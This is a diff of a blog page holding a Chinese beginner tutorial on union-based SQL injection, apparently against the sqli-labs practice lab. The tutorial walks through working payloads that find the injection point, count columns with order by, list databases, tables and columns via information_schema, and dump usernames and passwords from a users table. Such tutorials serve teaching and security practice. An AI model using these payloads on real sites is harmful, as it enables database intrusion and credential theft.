@@ -1,69 +1,79 @@
-<!DOCTYPE html>
+<!DOCTYPE HTML>
 <html>
-  <head>
-    <meta charset="utf-8" />
-    <meta name="baidu-site-verification" content="vvVgSQUzPU" />
-    <meta
-      name="viewport"
-      content="width=device-width, initial-scale=1, maximum-scale=1"
-    />
-    <meta name="keywords" content="虎虎|博客|个人|utone|Utone|">
-    <meta name="description" content="骑士恨煎蛋，骑士恨孜然">
-    
-    <title>
-       SQL注入-联合查询入门 -  Willianir&#39;s home
-    </title>
-    
-<link rel="stylesheet" href="/css/style.css">
- 
-    
-      <link rel="icon" href="/images/favicon.ico" />
-    
-  <meta name="generator" content="Hexo 5.3.0"></head>
-  <body>
-    <div id="container">
-      <div id="main-left">
-        <div id="introduce">
-          <div class="logo-worp">
-            <a href="/"><img class="logo" src="/images/logo.png" alt=""/></a>
-          </div>
-          <ul>
-            
-              <li><a href="/"> Home </a></li>
-            
-              <li><a href="/archives"> Archive </a></li>
-            
-              <li><a href="/about"> About </a></li>
-            
-              <li><a href="/atom.xml"> RSS </a></li>
-            
-            <li>
-              <img id="search-img" src="/images/search.svg" alt="search" />
-            </li>
-          </ul>
-           
-            <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#%E5%89%8D%E8%A8%80"><span class="post-toc-number">1.</span> <span class="post-toc-text">前言</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#%E4%B8%80%E3%80%81%E5%88%A4%E6%96%AD%E6%B3%A8%E5%85%A5%E7%82%B9%E8%BF%98%E6%98%AF%E6%95%B4%E5%BD%A2%E6%88%96%E5%AD%97%E7%AC%A6%E5%9E%8B"><span class="post-toc-number">2.</span> <span class="post-toc-text">一、判断注入点还是整形或字符型</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#%E4%BA%8C%E3%80%81%E5%88%A4%E6%96%AD%E5%88%97%E6%95%B0"><span class="post-toc-number">3.</span> <span class="post-toc-text">二、判断列数</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#%E4%B8%89-%E6%89%BE%E5%88%B0%E6%98%BE%E7%A4%BA%E4%BD%8D"><span class="post-toc-number">4.</span> <span class="post-toc-text">三.找到显示位</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#%E5%9B%9B-%E8%8E%B7%E5%8F%96%E5%BA%93%E5%90%8D"><span class="post-toc-number">5.</span> <span class="post-toc-text">四.获取库名</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#%E4%BA%94-%E8%8E%B7%E5%8F%96%E8%A1%A8%E5%90%8D"><span class="post-toc-number">6.</span> <span class="post-toc-text">五.获取表名</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#%E5%85%AD-%E8%8E%B7%E5%8F%96%E5%88%97%E5%90%8D"><span class="post-toc-number">7.</span> <span class="post-toc-text">六.获取列名</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#%E4%B8%83-%E8%8E%B7%E5%8F%96%E5%AD%97%E6%AE%B5%E4%BF%A1%E6%81%AF"><span class="post-toc-number">8.</span> <span class="post-toc-text">七.获取字段信息</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#%E6%80%BB%E7%BB%93"><span class="post-toc-number">9.</span> <span class="post-toc-text">总结</span></a></li></ol> 
-          
-        </div>
-      </div>
-      <div id="main-right"><div id="post">
-    
-    <header class="article-header">
-        <h1>
-            SQL注入-联合查询入门
-        </h1>
-    </header>
-    
-    <div class="post-meta">
-        <time class="post-data" datetime="2021-02-05T09:18:57.446Z" itemprop="datePublished">
-            2021-02-05
-        </time>
-        
-        
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black">
+  <meta name="google-site-verification" content="" />
+  <meta name="referrer" content="unsafe-url">
+  
+  <title>SQL注入-联合查询入门</title>
+  <meta name="author" content="Willianhuanbian">
+  <meta name="description" content="前言联合查询：一：按照注入语法分为:联合查询注入Union/报错查询注入error/布尔型注入Boolean/延时注入Time/堆叠查询注入
+二：联合查询注入是最简单的一种注入方式,但是要求页面必须有显示位.否则无法注入.
+显示位:可以理解为从数据库提取的数据被显示在前端. 如果没有显示位,我们无法">
+  
+  
+  <meta property="og:title" content="SQL注入-联合查询入门"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta property="og:site_name" content="Willianir&#39;s home"/>
+  <link href="/apple-touch-icon-precomposed.png" sizes="180x180" rel="apple-touch-icon-precomposed">
+  <link rel="alternate" href="/atom.xml" title="Willianir&#39;s home" type="application/atom+xml">
+  <link rel="stylesheet" href="/css/m.min.css">
+  <link rel="icon" type="image/x-icon" href="/favicon.ico">
+  <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML" async></script>
+
+<meta name="generator" content="Hexo 5.3.0"></head>
+
+<body>
+  <a id="top"></a>
+  <div id="main">
+    <div class="main-ctnr">
+      <div class="behind">
+  <a href="/" class="back black-color">
+    <svg class="i-close" viewBox="0 0 32 32" width="22" height="22" fill="none" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="3">
+        <path d="M2 30 L30 2 M30 30 L2 2"></path>
+    </svg>
+  </a>
+  
+</div>
+
+
+  <article class="standard post">
+    <div class="title">
+      
+  
+    <h1 class="page-title center">
+        SQL注入-联合查询入门
+    </h1>
+  
+
+
     </div>
+    <div class="meta center">
+      <time datetime="2021-02-05T09:18:57.446Z" itemprop="datePublished">
+  <svg class="i-calendar" viewBox="0 0 32 32" width="16" height="16" fill="none" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2">
+    <path d="M2 6 L2 30 30 30 30 6 Z M2 15 L30 15 M7 3 L7 9 M13 3 L13 9 M19 3 L19 9 M25 3 L25 9"></path>
+  </svg>
+  &nbsp;
+  2021-02-05
+</time>
+
+
+
+
+
+
+    </div>
+    <hr>
     
-    <div class="post-entry">
-        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>联合查询：<br>一：按照注入语法分为:联合查询注入Union/报错查询注入error/布尔型注入Boolean/延时注入Time/堆叠查询注入</p>
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E5%88%A4%E6%96%AD%E6%B3%A8%E5%85%A5%E7%82%B9%E8%BF%98%E6%98%AF%E6%95%B4%E5%BD%A2%E6%88%96%E5%AD%97%E7%AC%A6%E5%9E%8B"><span class="toc-text">一、判断注入点还是整形或字符型</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E5%88%A4%E6%96%AD%E5%88%97%E6%95%B0"><span class="toc-text">二、判断列数</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%89-%E6%89%BE%E5%88%B0%E6%98%BE%E7%A4%BA%E4%BD%8D"><span class="toc-text">三.找到显示位</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9B%9B-%E8%8E%B7%E5%8F%96%E5%BA%93%E5%90%8D"><span class="toc-text">四.获取库名</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%94-%E8%8E%B7%E5%8F%96%E8%A1%A8%E5%90%8D"><span class="toc-text">五.获取表名</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%85%AD-%E8%8E%B7%E5%8F%96%E5%88%97%E5%90%8D"><span class="toc-text">六.获取列名</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%83-%E8%8E%B7%E5%8F%96%E5%AD%97%E6%AE%B5%E4%BF%A1%E6%81%AF"><span class="toc-text">七.获取字段信息</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-text">总结</span></a></li></ol>
+    
+    <div class="picture-container">
+      
+    </div>
+    <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>联合查询：<br>一：按照注入语法分为:联合查询注入Union/报错查询注入error/布尔型注入Boolean/延时注入Time/堆叠查询注入</p>
 <p>二：联合查询注入是最简单的一种注入方式,但是要求页面必须有显示位.否则无法注入.</p>
 <p>显示位:可以理解为从数据库提取的数据被显示在前端. 如果没有显示位,我们无法查看注入的结果.</p>
 <p>三：联合查询一般步骤：<br>1、判断注入点还是整形或字符型<br>2、判断查询列数<br>3、判断显示位<br>4、获取所有数据库名<br>5、获取数据库所有表名<br>6、获取字段名<br>7、获取字段中的数据</p>
@@ -79,50 +89,91 @@
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">\ (转义符) <br></code></pre></td></tr></table></figure>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">-1</span>/+<span class="hljs-number">1</span> 回显下一个或上一个页面(整型判断)<br></code></pre></td></tr></table></figure>
 <p>注：加号‘+’在URL中有特殊含义，因此在需要对其进行URL编码为%2b</p>
-<p>先判断是否存在注入,如果存在(正常和异常页面显示不同则存在注入)是字符型还是整型注入。<br><img  src="https://img-blog.csdnimg.cn/20210205154410931.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br>这里是显示正常的，添加<code>and1=1</code>以及<code>and1=2</code>(1=2为假）来判断是否为整形注入<br><img  src="https://img-blog.csdnimg.cn/20210205154917253.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br><img  src="https://img-blog.csdnimg.cn/20210205154933740.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br>可以看出页面均显示正常因此不是整形注入</p>
+<p>先判断是否存在注入,如果存在(正常和异常页面显示不同则存在注入)是字符型还是整型注入。<br><img src="https://img-blog.csdnimg.cn/20210205154410931.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这里是显示正常的，添加<code>and1=1</code>以及<code>and1=2</code>(1=2为假）来判断是否为整形注入<br><img src="https://img-blog.csdnimg.cn/20210205154917253.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210205154933740.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>可以看出页面均显示正常因此不是整形注入</p>
 <p>加<code>’</code>以及<code>--+</code>注释说明来判断是否为字符型</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">？id=<span class="hljs-number">1</span>’and1=<span class="hljs-number">1</span>--+ 时<br></code></pre></td></tr></table></figure>
-<p><img  src="https://img-blog.csdnimg.cn/20210205155300845.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br>显示页面异常</p>
+<p><img src="https://img-blog.csdnimg.cn/20210205155300845.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>显示页面异常</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">？id=<span class="hljs-number">1</span>’and1=<span class="hljs-number">2</span>--+<br></code></pre></td></tr></table></figure>
-<p><img  src="https://img-blog.csdnimg.cn/20210205155449629.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br>显示页面错误，故可判断为字符注入</p>
-<h1 id="二、判断列数"><a href="#二、判断列数" class="headerlink" title="二、判断列数"></a>二、判断列数</h1><p>order by （用来查询列数）用来对表里的数据进行排序,order  by 1 表示按照第一列进行排序.依次类推.<br><code>？id=1&#39; order by 1</code><br>从1到3：均显示正常<img  src="https://img-blog.csdnimg.cn/20210205160435794.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span></p>
+<p><img src="https://img-blog.csdnimg.cn/20210205155449629.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>显示页面错误，故可判断为字符注入</p>
+<h1 id="二、判断列数"><a href="#二、判断列数" class="headerlink" title="二、判断列数"></a>二、判断列数</h1><p>order by （用来查询列数）用来对表里的数据进行排序,order  by 1 表示按照第一列进行排序.依次类推.<br><code>？id=1&#39; order by 1</code><br>从1到3：均显示正常<img src="https://img-blog.csdnimg.cn/20210205160435794.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">order by <span class="hljs-number">4</span>--+ 时<br></code></pre></td></tr></table></figure>
-<p><img  src="https://img-blog.csdnimg.cn/20210205160624180.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br>显示异常，说明没有第4列，只存在前3列</p>
+<p><img src="https://img-blog.csdnimg.cn/20210205160624180.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>显示异常，说明没有第4列，只存在前3列</p>
 <h1 id="三-找到显示位"><a href="#三-找到显示位" class="headerlink" title="三.找到显示位"></a>三.找到显示位</h1><p>UNION的作用是将两个select查询结果合并，为了爆出第一位后面的显示位需要隐藏正常结果，比如将<code>？id=1</code>改为<code>？id=-1</code>，使union前面的语句报错，执行后面的，爆出显示位</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">？id=<span class="hljs-number">-1</span>’<span class="hljs-keyword">union</span> select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> --+<br></code></pre></td></tr></table></figure>
-<p><img  src="https://img-blog.csdnimg.cn/20210205162344790.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br><img  src="https://img-blog.csdnimg.cn/20210205162403821.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br>可以看出只有当id=-1时才可以爆出笑显示位，显示位：2和3，可以插入查询语句</p>
+<p><img src="https://img-blog.csdnimg.cn/20210205162344790.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210205162403821.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>可以看出只有当id=-1时才可以爆出笑显示位，显示位：2和3，可以插入查询语句</p>
 <h1 id="四-获取库名"><a href="#四-获取库名" class="headerlink" title="四.获取库名"></a>四.获取库名</h1><p>group_concat()一次性显示： </p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function">select <span class="hljs-title">group_concat</span><span class="hljs-params">(SCHEMA_NAME)</span> from information_schema.SCHEMATA</span><br></code></pre></td></tr></table></figure>
 <p>显示当前数据库： databas()</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">？id=<span class="hljs-number">-1&#x27;u</span>nion select <span class="hljs-number">1</span>,database(),<span class="hljs-number">3</span> --+<br></code></pre></td></tr></table></figure>
-<p><img  src="https://img-blog.csdnimg.cn/20210205163109214.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br>得到库名：security</p>
+<p><img src="https://img-blog.csdnimg.cn/20210205163109214.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>得到库名：security</p>
 <h1 id="五-获取表名"><a href="#五-获取表名" class="headerlink" title="五.获取表名"></a>五.获取表名</h1><p>从获取库名的讲解，在这里使用group_concat()函数加一个数据表名table_name,然后指定一个来源得到库中的表名</p>
 <figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">?id=-1&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#x27;security&#x27; --+<br></code></pre></td></tr></table></figure>
-<p><img  src="https://img-blog.csdnimg.cn/20210205164455524.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br>得到表名：emails，referers，uagents，users</p>
+<p><img src="https://img-blog.csdnimg.cn/20210205164455524.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>得到表名：emails，referers，uagents，users</p>
 <h1 id="六-获取列名"><a href="#六-获取列名" class="headerlink" title="六.获取列名"></a>六.获取列名</h1><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">?id=-1&#x27;union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; --+<br></code></pre></td></tr></table></figure>
-<p>从users中获取<br><img  src="https://img-blog.csdnimg.cn/20210205165516791.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span></p>
+<p>从users中获取<br><img src="https://img-blog.csdnimg.cn/20210205165516791.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
 <h1 id="七-获取字段信息"><a href="#七-获取字段信息" class="headerlink" title="七.获取字段信息"></a>七.获取字段信息</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">?id=<span class="hljs-number">-1&#x27;</span> <span class="hljs-keyword">union</span> select <span class="hljs-number">1</span>,group_concat(concat_ws(<span class="hljs-number">0x23</span>,username,password)),<span class="hljs-number">3</span> from users --+<br></code></pre></td></tr></table></figure>
-<p>这里是username,password的信息，3是该表中有三列，from 为从users中获取的<br><img  src="https://img-blog.csdnimg.cn/20210205170105883.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br><img  src="https://img-blog.csdnimg.cn/20210205170124355.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br>获取成功了！</p>
+<p>这里是username,password的信息，3是该表中有三列，from 为从users中获取的<br><img src="https://img-blog.csdnimg.cn/20210205170105883.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210205170124355.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>获取成功了！</p>
 <h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>union注入是最简单方便的,但是要求页面必须有显示位,没有就没法利用，在学习sql注入的道路上我们才刚刚起步，加油吧少年！</p>
 
-    </div>
-    <!--畅言PC和WAP自适应版-->
-  
-</div></div>
-    </div>
-    <div id="footer">骑士恨煎蛋，骑士恨孜然</div>
-    <img id="top" src="/images/up-circle.svg" alt="top" />
+
+  </article>
+  <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+  <div class="busuanzi center">
+    page PV:&nbsp;<span id="busuanzi_value_page_pv"></span>&nbsp;・&nbsp;
+    site PV:&nbsp;<span id="busuanzi_value_site_pv"></span>&nbsp;・&nbsp;
+    site UV:&nbsp;<span id="busuanzi_value_site_uv"></span>
+  </div>
+
+
     
-  </body>
-</html>
-<!-- 加载主题脚本文件 -->
-
-<script src="/scripts/utone.js"></script>
 
 
+
+
+
+    </div>
+  </div>
+  <footer class="page-footer"><div class="clearfix">
+</div>
+<div class="right-foot">
+    <div class="firstrow">
+        <a href="#top" target="_self">
+        <svg class="i-caret-right" viewBox="0 0 32 32" width="24" height="24" fill="none" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="3">
+            <path d="M10 30 L26 16 10 2 Z"></path>
+        </svg>
+        </a>
+        © XXX 2016-2021
+    </div>
+    <div class="secondrow">
+        <a target="_blank" rel="noopener" href="https://github.com/gaoryrt/hexo-theme-pln">
+        Theme Pln
+        </a>
+    </div>
+</div>
+<div class="clearfix">
+</div>
+</footer>
+  <script src="//cdn.bootcss.com/jquery/2.2.1/jquery.min.js"></script>
+<script src="/js/search.min.js"></script>
 <script type="text/javascript">
-  window.onload = function() {
-    scroll.init()
-    siteSearch.init()
-  }
+
+// disqus scripts
+
+
+// dropdown scripts
+$(".dropdown").click(function(event) {
+  var current = $(this);
+  event.stopPropagation();
+  $(current).children(".dropdown-content")[($(current).children(".dropdown-content").hasClass("open"))?'removeClass':'addClass']("open")
+});
+$(document).click(function(){
+    $(".dropdown-content").removeClass("open");
+})
+
+var path = "/search.xml";
+searchFunc(path, 'local-search-input', 'local-search-result');
+
 </script>
+
+</body>
+</html>
